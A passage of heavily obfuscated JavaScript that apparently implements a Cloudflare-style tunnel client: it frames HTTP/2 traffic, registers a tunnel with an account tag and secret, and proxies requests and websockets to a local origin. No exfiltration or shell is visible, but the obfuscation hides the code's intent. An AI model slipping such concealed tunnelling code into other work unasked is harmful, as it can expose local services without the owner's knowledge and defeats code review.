        if (this[dD(0x3ea)])
            return Promise[dD(0x4e2)](new Error(b[dD(0x633)]));
        return new Promise((d, f) => {
            const dE = dD;
            this[dE(0x700)][dE(0x4a7)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this['_drain']();
        });
    }
}
class a0ax {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const dF = a0aX, l = {
                'psqCg': dF(0x800),
                'fHziE': function (o, p) {
                    return o || p;
                }
            }, m = l[dF(0x345)]['split']('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[dF(0x837)] = b;
                continue;
            case '1':
                this['peerMaxFrame'] = a0a6;
                continue;
            case '2':
                this[dF(0x6d4)] = g;
                continue;
            case '3':
                this[dF(0x451)] = h;
                continue;
            case '4':
                this[dF(0x463)] = a;
                continue;
            case '5':
                this[dF(0x32e)] = i;
                continue;
            case '6':
                this[dF(0x282)] = new a0aw(a);
                continue;
            case '7':
                this[dF(0x3f0)] = [];
                continue;
            case '8':
                this[dF(0x582)] = new Map();
                continue;
            case '9':
                this['tunnelId'] = f;
                continue;
            case '10':
                this['tunnelState'] = l[dF(0x7fc)](k, { 'printed': ![] });
                continue;
            case '11':
                this[dF(0x243)] = 0xffff;
                continue;
            case '12':
                this[dF(0x1c5)] = null;
                continue;
            case '13':
                this[dF(0x1df)] = new a0af();
                continue;
            case '14':
                this[dF(0x75c)] = ![];
                continue;
            case '15':
                this['tunnelSecret'] = d;
                continue;
            case '16':
                this['accountTag'] = c;
                continue;
            case '17':
                this[dF(0x418)] = ![];
                continue;
            case '18':
                this['streams'] = new Map();
                continue;
            case '19':
                this[dF(0x465)] = j;
                continue;
            case '20':
                this[dF(0x657)] = ![];
                continue;
            }
            break;
        }
    }
    ['sendFrame'](a, b, c, d = Buffer[a0aX(0x252)](0x0)) {
        const dG = a0aX, f = {
                'DQGRN': function (h, i) {
                    return h > i;
                },
                'hnFOh': function (h, i) {
                    return h & i;
                }
            };
        if (f['DQGRN'](d['length'], 0xffffff))
            throw new Error(dG(0x459));
        const g = Buffer[dG(0x252)](0x9);
        g[dG(0x6be)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[dG(0x663)](f[dG(0x72f)](c, 0x7fffffff), 0x5), this[dG(0x463)]['write'](Buffer[dG(0x83f)]([
            g,
            d
        ]));
    }
    [a0aX(0x49c)](a, b, c = ![]) {
        const dH = a0aX, d = {
                'VXyWM': function (h, i) {
                    return h(i);
                },
                'XBanO': function (h, i) {
                    return h | i;
                }
            }, f = d[dH(0x2ea)](a0ai, b), g = d[dH(0x88e)](0x4, c ? 0x1 : 0x0);
        this[dH(0x783)](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const dI = a0aX, b = {
                'ZNION': function (c, d) {
                    return c > d;
                }
            };
        if (this[dI(0x243)] > 0x0 && b[dI(0x208)](this[dI(0x582)][dI(0x858)](a) ?? 0xffff, 0x0))
            return Promise[dI(0x409)]();
        return new Promise(c => {
            const dJ = dI;
            this['windowWaiters'][dJ(0x4a7)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aX(0x85a)]() {
        const dK = a0aX, a = {
                'xOxLK': function (c, d) {
                    return c > d;
                },
                'scVCe': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[dK(0x3f0)]) {
            const d = this[dK(0x582)][dK(0x858)](c['streamId']) ?? 0xffff;
            a[dK(0x7ca)](this[dK(0x243)], 0x0) && a[dK(0x874)](d, 0x0) ? c['resolve']() : b['push'](c);
        }
        this[dK(0x3f0)] = b;
    }
    [a0aX(0x4d5)]() {
        const dL = a0aX;
        for (const a of this[dL(0x3f0)]) {
            a[dL(0x409)]();
        }
        this[dL(0x3f0)] = [];
    }
    async [a0aX(0x40a)](a, b, c = ![]) {
        const dM = a0aX, d = {
                'sYPhS': function (h, i) {
                    return h >= i;
                },
                'pHBZi': function (h, i) {
                    return h + i;
                },
                'SDOmo': function (h, i) {
                    return h - i;
                },
                'WeeZD': function (h, i) {
                    return h < i;
                }
            }, f = b[dM(0x38d)];
        let g = 0x0;
        do {
            await this[dM(0x372)](a);
            if (this['stopped'])
                return;
            const h = this[dM(0x582)][dM(0x858)](a) ?? 0xffff, i = Math[dM(0x71e)](f - g, this['connectionWindow'], h, this[dM(0x153)]), j = c && d['sYPhS'](d['pHBZi'](g, i), f) ? 0x1 : 0x0, k = b['subarray'](g, g + i);
            this[dM(0x243)] -= i, this[dM(0x582)]['set'](a, d[dM(0x759)](h, i)), this['sendFrame'](0x0, j, a, k), g += i;
        } while (d['WeeZD'](g, f));
    }
    [a0aX(0x3c1)](a, b) {
        const dN = a0aX, c = {
                'IdMIN': function (d, f) {
                    return d > f;
                }
            };
        if (c[dN(0x15e)](b, 0x0)) {
            const d = Buffer['alloc'](0x4);
            d[dN(0x663)](b & 0x7fffffff, 0x0), this[dN(0x783)](0x8, 0x0, a, d);
        }
    }
    async [a0aX(0x3ff)]() {
        const dO = a0aX, a = {
                'GbxxG': function (i, j) {
                    return i & j;
                }
            }, b = await this[dO(0x282)][dO(0x3ac)](0x9), c = b['readUIntBE'](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dO(0x76f)](b['readUInt32BE'](0x5), 0x7fffffff), h = await this[dO(0x282)][dO(0x3ac)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aX(0x1f3)](a, b, c) {
        const dP = a0aX, d = {
                'WuGdU': function (g, h) {
                    return g & h;
                },
                'xVdus': function (g, h) {
                    return g > h;
                },
                'tszho': function (g, h) {
                    return g - h;
                },
                'rXrka': function (g, h) {
                    return g & h;
                },
                'jEGhw': function (g, h) {
                    return g & h;
                },
                'lovtf': function (g, h) {
                    return g !== h;
                },
                'CfJhK': 'expected\x20CONTINUATION\x20frame'
            };
        if (d['WuGdU'](a, 0x8)) {
            const g = c[0x0];
            c = c[dP(0x6aa)](0x1);
            if (d['xVdus'](g, c[dP(0x38d)]))
                throw new Error(dP(0x8ac));
            c = g ? c[dP(0x6aa)](0x0, d[dP(0x263)](c[dP(0x38d)], g)) : c;
        }
        d['rXrka'](a, 0x20) && (c = c['subarray'](0x5));
        const f = [c];
        while (!d['jEGhw'](a, 0x4)) {
            const h = await this[dP(0x3ff)]();
            if (d[dP(0x601)](h[0x0], 0x9) || d[dP(0x601)](h[0x2], b))
                throw new Error(d['CfJhK']);
            f[dP(0x4a7)](h[0x3]), a = h[0x1];
        }
        return this[dP(0x1df)]['decode'](Buffer[dP(0x83f)](f));
    }
    ['openControl'](a) {
        const dQ = a0aX, b = {
                'mYlNM': function (c, d) {
                    return c !== d;
                },
                'wYiAF': dQ(0x402),
                'TuJXH': '200'
            };
        if (b[dQ(0x176)](this[dQ(0x1c5)], null))
            return;
        this[dQ(0x1c5)] = new a0az(this, a, this[dQ(0x451)]), this[dQ(0x49c)](a, [[
                b[dQ(0x40f)],
                b[dQ(0x349)]
            ]]), this[dQ(0x1c5)]['start'](this[dQ(0x7c6)], this[dQ(0x330)], this[dQ(0x1c6)], this[dQ(0x6d4)]);
    }
    [a0aX(0x662)](a, b) {
        const dR = a0aX, c = {
                'QDJvX': 'utf8',
                'ElHYA': dR(0x474),
                'UmVyd': 'application/json',
                'GBSFt': 'content-length',
                'tlROp': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[dR(0x1ef)](b['length'] ? b[dR(0x562)](c['QDJvX']) : '{}'), h = parseInt(g[dR(0x113)], 0xa);
            !Number[dR(0x7a7)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer['from'](JSON[dR(0x7cb)]({ 'latestAppliedVersion': d }));
        this[dR(0x49c)](a, [
            [
                dR(0x402),
                '200'
            ],
            [
                c[dR(0x16a)],
                c[dR(0x45d)]
            ],
            [
                c[dR(0x20b)],
                c['tlROp'](String, f[dR(0x38d)])
            ]
        ]), this[dR(0x40a)](a, f, !![]);
    }
    [a0aX(0x4e9)](a, b) {
        const dS = a0aX, c = {
                'fSNiv': dS(0x206),
                'LSxVJ': function (g, h) {
                    return g === h;
                },
                'xPkwp': dS(0x2f4)
            }, d = c[dS(0x784)][dS(0x622)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[dS(0x853)])
                    return;
                continue;
            case '1':
                if (c[dS(0x7e1)](b[dS(0x3b5)], c[dS(0x47a)])) {
                    this[dS(0x662)](a, Buffer[dS(0x83f)](b[dS(0x737)]));
                    return;
                }
                continue;
            case '2':
                if (b['websocket'])
                    return;
                continue;
            case '3':
                b[dS(0x853)] = !![];
                continue;
            case '4':
                this[dS(0x4b5)](a, b)[dS(0x237)](() => {
                });
                continue;
            }
            break;
        }
    }
    async [a0aX(0x4b5)](a, b) {
        const dT = a0aX, c = {
                'nHvgz': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'PQSMD': function (d, f) {
                    return d === f;
                },
                'hifiD': 'content-length',
                'LuWft': dT(0x36d),
                'KAfOK': 'cf-cloudflared-',
                'ypaDo': dT(0x154),
                'feRSV': dT(0x3b5),
                'ePBkx': function (d, f) {
                    return d(f);
                },
                'FEirM': dT(0x474),
                'zrugf': function (d, f) {
                    return d(f);
                },
                'ykdWE': dT(0x402),
                'jydHV': function (d, f) {
                    return d(f);
                },
                'NVFPk': dT(0x50f),
                'hIiwL': dT(0x7eb),
                'LLxJh': function (d, f) {
                    return d + f;
                },
                'nxvKo': function (d, f) {
                    return d + f;
                },
                'BDlgz': '\x20proxy\x20failed:\x20',
                'CzqyN': dT(0x5a1)
            };
        try {
            const d = await c[dT(0x49b)](a0aC, this[dT(0x837)], b[dT(0x18c)], b[dT(0x785)], b[dT(0x27c)], Buffer[dT(0x83f)](b[dT(0x737)])), f = [], g = [];
            for (const [k, l] of d[dT(0x27c)]) {
                const m = k[dT(0x118)]();
                c['PQSMD'](m, c[dT(0x405)]) && g[dT(0x4a7)]([
                    m,
                    l
                ]);
                const n = m[dT(0x1f5)](c[dT(0x7f3)]) || m[dT(0x1f5)](c[dT(0x854)]) || m[dT(0x1f5)](c[dT(0x748)]) || m['startsWith'](':');
                (!n || c[dT(0x4c8)](m, dT(0x180)) || c[dT(0x4c8)](m, c[dT(0x768)]) || m === 'sec-websocket-accept') && f[dT(0x4a7)]([
                    m,
                    l
                ]);
            }
            if (!f[dT(0x539)](([o]) => o === 'content-type')) {
                const o = c[dT(0x1d4)](a0ar, b['path']);
                o && f[dT(0x4a7)]([
                    c['FEirM'],
                    o
                ]);
            }
            const h = c[dT(0x291)](a0av, f), i = d['status'] === 0x65 ? 0xc8 : d['status'], j = [
                    [
                        c[dT(0x219)],
                        c[dT(0x130)](String, i)
                    ],
                    ...g,
                    [
                        c['NVFPk'],
                        h
                    ],
                    [
                        dT(0x19b),
                        c['hIiwL']
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d[dT(0x737)]) {
                await this[dT(0x40a)](a, p, ![]);
            }
            await this[dT(0x40a)](a, Buffer['alloc'](0x0), !![]);
        } catch (q) {
            this[dT(0x451)][dT(0x34a)](c[dT(0x734)](c[dT(0x86f)](c['LLxJh'](dT(0x6a2), a), c['BDlgz']), q));
            try {
                this[dT(0x49c)](a, [[
                        c['ykdWE'],
                        c['CzqyN']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aX(0x7cf)]() {
        const dU = a0aX, a = {
                'mKBth': dU(0x14c),
                'TluYN': function (d, f) {
                    return d + f;
                },
                'qEjTz': function (d, f) {
                    return d === f;
                },
                'pKFxa': function (d, f) {
                    return d & f;
                },
                'qfFTB': function (d, f) {
                    return d % f;
                },
                'Bbcvn': dU(0x61b),
                'hSvYf': function (d, f) {
                    return d < f;
                },
                'hzZNk': function (d, f) {
                    return d === f;
                },
                'wTGtW': function (d, f) {
                    return d + f;
                },
                'dKDJh': function (d, f) {
                    return d >= f;
                },
                'xceuU': function (d, f) {
                    return d <= f;
                },
                'kyWrn': function (d, f) {
                    return d !== f;
                },
                'OXnnw': function (d, f) {
                    return d & f;
                },
                'pmWrj': function (d, f) {
                    return d === f;
                },
                'RAfJF': function (d, f) {
                    return d === f;
                },
                'mzIqF': function (d, f) {
                    return d === f;
                },
                'NLAyv': function (d, f) {
                    return d === f;
                }
            }, b = await this['reader'][dU(0x3ac)](0x18);
        if (!b[dU(0x7ad)](Buffer[dU(0x3a5)](dU(0x7b5))))
            throw new Error(a[dU(0x28d)]);
        const c = Buffer[dU(0x252)](0x6);
        c[dU(0x574)](0x3, 0x0), c[dU(0x663)](0x64, 0x2), this[dU(0x783)](0x4, 0x0, 0x0, c);
        this['showTunnel'] && !this['tunnelState'][dU(0x53b)] && (process['stdout'][dU(0x462)](a['TluYN'](this[dU(0x32e)], '\x0a')), this[dU(0x52f)][dU(0x53b)] = !![]);
        try {
            while (!this['stopped']) {
                const [d, f, g, h] = await this[dU(0x3ff)]();
                if (a['qEjTz'](d, 0x4)) {
                    if (!a[dU(0x88c)](f, 0x1)) {
                        if (a[dU(0x416)](h[dU(0x38d)], 0x6))
                            throw new Error(a[dU(0x658)]);
                        for (let i = 0x0; a[dU(0x560)](i, h['length']); i += 0x6) {
                            const j = h[dU(0x754)](i), k = h[dU(0x155)](i + 0x2);
                            if (a['hzZNk'](j, 0x4)) {
                                const l = k - 0xffff;
                                for (const m of this[dU(0x582)][dU(0x524)]()) {
                                    this[dU(0x582)]['set'](m, Math['max'](0x0, a[dU(0x32f)](this[dU(0x582)][dU(0x858)](m), l)));
                                }
                            } else
                                a['hzZNk'](j, 0x5) && a['dKDJh'](k, 0x4000) && a[dU(0x6f5)](k, 0xffffff) && (this[dU(0x153)] = k);
                        }
                        this[dU(0x783)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !(f & 0x1) && this[dU(0x783)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[dU(0x70b)](d, 0x8)) {
                    if (a[dU(0x26d)](h['length'], 0x4))
                        continue;
                    const n = a['OXnnw'](h[dU(0x155)](0x0), 0x7fffffff);
                    a[dU(0x879)](g, 0x0) ? this[dU(0x243)] += n : this[dU(0x582)]['set'](g, (this[dU(0x582)][dU(0x858)](g) ?? 0xffff) + n);
                    this[dU(0x85a)]();
                    continue;
                }
                if (a[dU(0x19c)](d, 0x3)) {
                    this[dU(0x233)][dU(0x3f6)](g);
                    continue;
                }
                if (a[dU(0x5fb)](d, 0x7))
                    break;
                if (a[dU(0x212)](d, 0x1)) {
                    const o = await this[dU(0x1f3)](f, g, h);
                    !this['streamWindows'][dU(0x8a2)](g) && this[dU(0x582)]['set'](g, 0xffff);
                    this[dU(0x515)](g, f, o);
                    continue;
                }
                if (a[dU(0x3d6)](d, 0x0)) {
                    this[dU(0x483)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[dU(0x75c)] = !![], this[dU(0x4d5)]();
            for (const p of this[dU(0x233)][dU(0x22a)]()) {
                p[dU(0x2d3)] && p[dU(0x2d3)][dU(0x885)]();
            }
            try {
                this[dU(0x463)]['destroy']();
            } catch (q) {
            }
        }
    }
    [a0aX(0x515)](a, b, c) {
        const dV = a0aX, d = {
                'grvEq': function (i, j) {
                    return i === j;
                },
                'ilfdk': dV(0x3a1),
                'MBotB': dV(0x128),
                'eNTPO': dV(0x7c0),
                'zzdBt': function (i, j) {
                    return i === j;
                },
                'akLGP': dV(0x7e5),
                'HIutp': function (i, j) {
                    return i(j);
                },
                'WuJno': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dV(0x1f5)](':') ? f[i] = j : f[i[dV(0x118)]()] = j;
        }
        const g = (f[a0a4] || '')[dV(0x1c8)]()[dV(0x118)]();
        if (d['grvEq'](g, a0a5)) {
            this[dV(0x3d7)](a);
            b & 0x1 && (this[dV(0x1c5)]['finished'] = !![]);
            return;
        }
        const h = {
            'method': f[dV(0x594)] || d[dV(0x508)],
            'path': f[dV(0x14b)] || '/',
            'authority': f[d[dV(0x1e1)]] || '',
            'headers': c[dV(0x597)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[dV(0x7ee)](g, d[dV(0x34e)]) || d[dV(0x77c)]((f[d['akLGP']] || '')[dV(0x118)](), d[dV(0x34e)]),
            'ended': d[dV(0x295)](Boolean, d[dV(0x8a1)](b, 0x1)),
            'finished': ![]
        };
        this['streams']['set'](a, h);
        if (h['websocket'])
            h[dV(0x2d3)] = new a0ay(this, a, h, this[dV(0x837)], this[dV(0x451)]), h[dV(0x2d3)][dV(0x5e9)]();
        else
            h[dV(0x6ee)] && this[dV(0x4e9)](a, h);
    }
    [a0aX(0x483)](a, b, c) {
        const dW = a0aX, d = {
                'gPeNI': function (g, h) {
                    return g !== h;
                },
                'REBFt': function (g, h) {
                    return g === h;
                },
                'XilYW': function (g, h) {
                    return g & h;
                },
                'GhuHd': function (g, h) {
                    return g !== h;
                },
                'Pymyw': function (g, h) {
                    return g(h);
                }
            };
        this[dW(0x3c1)](0x0, c[dW(0x38d)]), this[dW(0x3c1)](a, c[dW(0x38d)]);
        if (d[dW(0x678)](this[dW(0x1c5)], null) && d[dW(0x84c)](this[dW(0x1c5)][dW(0x2b8)], a)) {
            this[dW(0x1c5)][dW(0x3af)](c);
            d[dW(0x828)](b, 0x1) && (this[dW(0x1c5)][dW(0x853)] = !![]);
            return;
        }
        const f = this[dW(0x233)][dW(0x858)](a);
        if (d[dW(0x84c)](f, undefined))
            return;
        if (d['GhuHd'](f[dW(0x2d3)], undefined)) {
            f['websocketProxy'][dW(0x3af)](c, d[dW(0x5c1)](Boolean, d[dW(0x828)](b, 0x1)));
            return;
        }
        c['length'] && f[dW(0x737)][dW(0x4a7)](c), b & 0x1 && (f[dW(0x6ee)] = !![], this[dW(0x4e9)](a, f));
    }
}
function a0b(a, b) {
    a = a - 0x110;
    const c = a0a();
    let d = c[a];
    if (a0b['PgOiXv'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['lwYRqm'] = e, a0b['LrmEaR'] = {}, a0b['PgOiXv'] = !![];
    }
    const f = c[0x0];
    a0b['tFHxsl'] !== f && (a0b['LrmEaR'] = {}, a0b['tFHxsl'] = f);
    const g = a0b['LrmEaR'][a];
    return g === undefined ? (d = a0b['lwYRqm'](d), a0b['LrmEaR'][a] = d) : d = g, d;
}
class a0ay {
    constructor(a, b, c, d, f) {
        const dX = a0aX;
        this['connection'] = a, this[dX(0x2b8)] = b, this[dX(0x2c5)] = c, this[dX(0x837)] = d, this[dX(0x451)] = f, this[dX(0x5c4)] = [], this[dX(0x700)] = [], this[dX(0x75c)] = ![], this[dX(0x463)] = null;
    }
    ['start']() {
        const dY = a0aX;
        this['run']()[dY(0x237)](() => {
        });
    }
    [a0aX(0x3af)](a, b = ![]) {
        const dZ = a0aX;
        a['length'] && this[dZ(0x5c4)]['push'](a), b && this['queue'][dZ(0x4a7)](null), this[dZ(0x496)]();
    }
    ['stop']() {
        const e0 = a0aX, a = {
                'LshBX': function (b, c) {
                    return b !== c;
                }
            };
        if (this[e0(0x75c)])
            return;
        this['stopped'] = !![], this[e0(0x496)]();
        if (a[e0(0x675)](this['sock'], null))
            try {
                this[e0(0x463)][e0(0x56e)]();
            } catch (b) {
            }
    }
    ['_wake']() {
        const e1 = a0aX, a = {
                'uwRWq': function (b) {
                    return b();
                }
            };
        for (const b of this[e1(0x700)]) {
            a[e1(0x7df)](b);
        }
        this[e1(0x700)] = [];
    }
    async [a0aX(0x441)]() {
        const e2 = a0aX;
        while (!this[e2(0x75c)]) {
            if (this[e2(0x5c4)]['length'])
                return this[e2(0x5c4)][e2(0x513)]();
            await new Promise(a => this[e2(0x700)]['push'](a));
        }
        return null;
    }
    async [a0aX(0x7cf)]() {
        const e3 = a0aX, a = {
                'ETbZx': function (b, c) {
                    return b(c);
                },
                'gmyzL': function (b, c) {
                    return b(c);
                },
                'deNTC': function (b, c) {
                    return b === c;
                },
                'VUqdH': e3(0x6e6),
                'nAGfi': e3(0x36d),
                'zQkCJ': e3(0x154),
                'QxJXn': e3(0x180),
                'FNsmo': 'upgrade',
                'dXiFg': 'sec-websocket-accept',
                'UJIiS': function (b, c) {
                    return b === c;
                },
                'SutKm': function (b, c) {
                    return b(c);
                },
                'wFNKU': e3(0x50f),
                'flewK': function (b, c) {
                    return b + c;
                },
                'cNtoq': function (b, c) {
                    return b + c;
                },
                'BqFAC': e3(0x499),
                'QivZt': e3(0x402),
                'VZLIl': e3(0x5a1)
            };
        try {
            this[e3(0x463)] = await a[e3(0x2e5)](a0aA, this[e3(0x837)]), this[e3(0x148)]();
            const b = await a['gmyzL'](a0aD, this[e3(0x463)]), c = [], d = [];
            for (const [i, j] of b[e3(0x27c)]) {
                const k = i[e3(0x118)]();
                a['deNTC'](k, a['VUqdH']) && d['push']([
                    k,
                    j
                ]);
                const l = k['startsWith'](a[e3(0x266)]) || k[e3(0x1f5)](e3(0x5a9)) || k[e3(0x1f5)](a[e3(0x2d6)]) || k[e3(0x1f5)](':');
                (!l || k === a['QxJXn'] || a['deNTC'](k, a['FNsmo']) || k === a[e3(0x189)]) && c[e3(0x4a7)]([
                    k,
                    j
                ]);
            }
            const f = a[e3(0x2e5)](a0av, c), g = a[e3(0x810)](b[e3(0x126)], 0x65) ? 0xc8 : b['status'], h = [
                    [
                        ':status',
                        a[e3(0x728)](String, g)
                    ],
                    ...d,
                    [
                        a[e3(0x4c4)],
                        f
                    ],
                    [
                        e3(0x19b),
                        e3(0x7eb)
                    ]
                ];
            this[e3(0x180)][e3(0x49c)](this['streamId'], h), this[e3(0x327)]()['catch'](() => {
            }), await this[e3(0x4ea)](b[e3(0x6a5)]);
        } catch (m) {
            this[e3(0x451)][e3(0x34a)](a['flewK'](a[e3(0x1af)](a[e3(0x3ad)](a[e3(0x7fa)], this['streamId']), e3(0x49f)), m));
            try {
                this[e3(0x180)][e3(0x49c)](this[e3(0x2b8)], [[
                        a[e3(0x64f)],
                        a['VZLIl']
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async [a0aX(0x4ea)](a) {
        const e4 = a0aX;
        a[e4(0x38d)] && await this[e4(0x180)][e4(0x40a)](this['streamId'], a, ![]);
        for await (const b of this[e4(0x463)]) {
            if (this[e4(0x75c)])
                break;
            await this[e4(0x180)]['sendData'](this[e4(0x2b8)], b, ![]);
        }
        !this['stopped'] && await this['connection'][e4(0x40a)](this['streamId'], Buffer[e4(0x252)](0x0), !![]);
    }
    async [a0aX(0x327)]() {
        const e5 = a0aX;
        while (!this[e5(0x75c)]) {
            const a = await this[e5(0x441)]();
            if (a === null)
                return;
            try {
                this[e5(0x463)][e5(0x462)](a);
            } catch (b) {
                this['stopped'] = !![];
                return;
            }
        }
    }
    [a0aX(0x148)]() {
        const e6 = a0aX, a = {
                'bmDdK': function (i, j) {
                    return i + j;
                },
                'OEQBS': e6(0x4c5),
                'DWoRF': function (i, j) {
                    return i === j;
                },
                'xtpel': e6(0x65e),
                'uLzMM': e6(0x180),
                'bfryq': e6(0x3b5),
                'wnFzb': e6(0x6e6),
                'paVOP': e6(0x6e1),
                'mBpxH': function (i, j) {
                    return i === j;
                },
                'QdcvD': 'origin',
                'bqSjv': function (i, j) {
                    return i + j;
                },
                'lebvo': e6(0x680),
                'ExVWV': e6(0x469),
                'UiGRh': e6(0x684),
                'NRhQS': e6(0x48b),
                'micEU': e6(0x794),
                'LhGQC': 'latin1'
            }, b = new URL(this[e6(0x837)]), c = this[e6(0x2c5)]['path'][e6(0x1f5)]('/') ? this[e6(0x2c5)]['path'] : a[e6(0x5ab)]('/', this[e6(0x2c5)]['path']), d = [a['bmDdK'](e6(0x495), c) + a[e6(0x589)]];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[e6(0x2c5)][e6(0x27c)]) {
            const k = i[e6(0x118)]();
            if (a[e6(0x443)](k, a[e6(0x548)]) || a[e6(0x443)](k, a[e6(0x33d)]) || a[e6(0x443)](k, a[e6(0x177)]) || a[e6(0x443)](k, a[e6(0x14f)]) || a[e6(0x443)](k, e6(0x4cd)))
                continue;
            if (a[e6(0x443)](k, a[e6(0x7e6)]))
                f = !![];
            else {
                if (a[e6(0x443)](k, e6(0x448)))
                    g = !![];
                else
                    a[e6(0x4f4)](k, a[e6(0x5f7)]) && (h = !![]);
            }
            d['push'](a[e6(0x272)](a[e6(0x272)](i, ':\x20'), j));
        }
        d['push'](a['bmDdK'](a[e6(0x31e)], b[e6(0x65e)])), !h && this[e6(0x2c5)][e6(0x19f)] && d[e6(0x4a7)](e6(0x479) + this[e6(0x2c5)][e6(0x19f)]), !f && d[e6(0x4a7)](a[e6(0x53f)] + a0k[e6(0x166)](0x10)['toString'](e6(0x71a))), !g && d['push'](a[e6(0x338)]), d[e6(0x4a7)](e6(0x207)), d['push'](a['NRhQS']), this[e6(0x463)][e6(0x462)](Buffer['from'](a[e6(0x272)](d[e6(0x344)]('\x0d\x0a'), a[e6(0x41e)]), a['LhGQC']));
    }
}
class a0az {
    constructor(a, b, c) {
        const e7 = a0aX;
        this[e7(0x180)] = a, this[e7(0x2b8)] = b, this[e7(0x451)] = c, this[e7(0x767)] = Buffer[e7(0x252)](0x0), this[e7(0x853)] = ![];
    }
    [a0aX(0x5e9)](a, b, c, d) {
        const e8 = a0aX;
        this['connection'][e8(0x40a)](this['streamId'], a0ak(0x0), ![]), this[e8(0x180)][e8(0x40a)](this[e8(0x2b8)], a0al(0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aX(0x3af)](a) {
        const e9 = a0aX, b = {
                'SwtCa': function (f, g) {
                    return f + g;
                },
                'YXjfI': e9(0x61e),
                'vWWYQ': e9(0x7b4),
                'UtBlD': function (f, g) {
                    return f + g;
                },
                'SBGGu': 'tunnel\x20registration\x20failed:\x20',
                'GoTZr': e9(0x346),
                'ytAGF': e9(0x591)
            };
        this[e9(0x767)] = this[e9(0x767)][e9(0x38d)] ? Buffer[e9(0x83f)]([
            this[e9(0x767)],
            a
        ]) : a;
        let c, d;
        [c, d] = a0am(this[e9(0x767)]), this[e9(0x767)] = d;
        for (const f of c) {
            try {
                const g = a0ap(f);
                g['ok'] ? (this[e9(0x451)][e9(0x604)](b['SwtCa'](b[e9(0x201)], g[e9(0x802)] || b[e9(0x1d6)])), this[e9(0x180)][e9(0x418)] = !![]) : (this['log'][e9(0x34a)](b[e9(0x572)](b[e9(0x724)], g['error'] || b[e9(0x357)])), this['connection'][e9(0x657)] = !![], this[e9(0x180)][e9(0x75c)] = !![]);
            } catch (h) {
                this[e9(0x451)][e9(0x4b3)](b[e9(0x572)](b[e9(0x719)], h));
            }
        }
    }
}
function a0aA(a) {
    const ea = a0aX, b = {
            'IycHy': ea(0x555),
            'SaFex': 'error',
            'WHDpW': function (c, d) {
                return c(d);
            },
            'tBhOB': function (c, d, f) {
                return c(d, f);
            },
            'ozsDK': 'secureConnect',
            'chFIu': function (c, d) {
                return c(d);
            },
            'aSUnr': ea(0x7a3),
            'rMdmU': function (c, d) {
                return c === d;
            },
            'qYQTT': ea(0x4dd)
        };
    return new Promise((c, d) => {
        const eb = ea, f = {
                'kIINP': function (n, o, p) {
                    return n(o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[eb(0x4f0)](d, new Error(eb(0x509)));
            return;
        }
        if (![
                'http:',
                b[eb(0x382)]
            ][eb(0x1be)](g[eb(0x112)]) || !g['hostname']) {
            d(new Error(eb(0x509)));
            return;
        }
        const h = b['rMdmU'](g['protocol'], b[eb(0x382)]), i = g[eb(0x458)] || (h ? 0x1bb : 0x50), j = a0i[eb(0x4dd)]({
                'host': g[eb(0x53c)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const ec = eb, q = b[ec(0x41c)]['split']('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        k = !![];
                        continue;
                    case '1':
                        j['removeListener'](b[ec(0x4f7)], m);
                        continue;
                    case '2':
                        b[ec(0x37c)](o, p);
                        continue;
                    case '3':
                        if (k)
                            return;
                        continue;
                    case '4':
                        j[ec(0x70c)](0x0);
                        continue;
                    }
                    break;
                }
            }, m = o => {
                const ed = eb;
                !k && f[ed(0x234)](l, d, o);
            };
        j['on'](b[eb(0x4f7)], m), j[eb(0x70c)](0x7530, () => j[eb(0x56e)](new Error(eb(0x68f)))), j['on'](b[eb(0x5b7)], () => {
            const ee = eb;
            if (!h) {
                b[ee(0x4d1)](l, c, j);
                return;
            }
            const o = a0j[ee(0x4dd)]({
                'socket': j,
                'servername': g[ee(0x53c)]
            });
            o['on'](b[ee(0x4f7)], p => {
                !k && l(d, p);
            }), o['on'](b[ee(0x723)], () => {
                l(c, o);
            });
        });
    });
}
function a0aB(a) {
    const ef = a0aX, b = {
            'bgcyY': function (d, f) {
                return d < f;
            }
        }, c = [];
    for (let d = 0x0; b[ef(0x2ba)](d, a[ef(0x4a1)][ef(0x38d)]); d += 0x2) {
        c[ef(0x4a7)]([
            a[ef(0x4a1)][d],
            a['rawHeaders'][d + 0x1]
        ]);
    }
    return c;
}
function a0aC(a, b, c, d, f) {
